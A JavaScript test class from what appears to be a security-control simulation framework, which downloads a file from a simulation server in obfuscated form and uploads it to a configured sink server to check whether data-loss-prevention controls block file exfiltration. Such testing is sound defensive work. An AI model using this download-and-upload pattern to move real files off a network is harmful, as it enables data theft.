import ServerRequest from '../framework/ServerRequest';
import Test from '../framework/Test';
import TestResult from '../framework/TestResult';
const testRunner = 'CIS133FileExfiltrationTest';

export default class CIS133FileExfiltrationTest extends Test {

    async run() {
        if (this.checkParameters('string', 'protocol', 'filename', 'uploadName')) {
            return new TestResult(this.parameters.testId, testRunner, false, "Missing protocol or filename parameter");
        }
        
        const downloadUrl = `${process.env.REACT_APP_SIMULATION_SERVER}/test/resources/files/${this.parameters.filename}`;

        const fileServer = this.parameters.protocol === "https" ? 
            process.env.REACT_APP_HTTPS_FILE_SERVER : process.env.REACT_APP_FILE_SERVER
        const uploadUrl = `${this.parameters.protocol}://${fileServer}/test/sinks/files?name=${encodeURI(this.parameters.uploadName)}&outcomeToken=${this.outcomeToken}&testId=${this.parameters.testId}`;

        return new ServerRequest(downloadUrl)
            .awaitBinaryObfuscatedResponse()
            .get()
            .then(response => {
                return new ServerRequest(uploadUrl)
                    .addBinaryPayload(response.payload)
                    .post()
            })
            .then(response => { 
                console.log(response)
                return new TestResult(this.parameters.testId, testRunner, true,"Successfully exfiltrated file",
                    {downloadUrl: downloadUrl, uploadUrl: uploadUrl})
            })
            .catch(reason => {
                return new TestResult(
                    this.parameters.testId,
                    testRunner,
                    false,
                    "Failed to exfiltrate file",
                    Object.assign(this.parameters, reason, {downloadUrl: downloadUrl, uploadUrl: uploadUrl})
                )
            })
    }

}
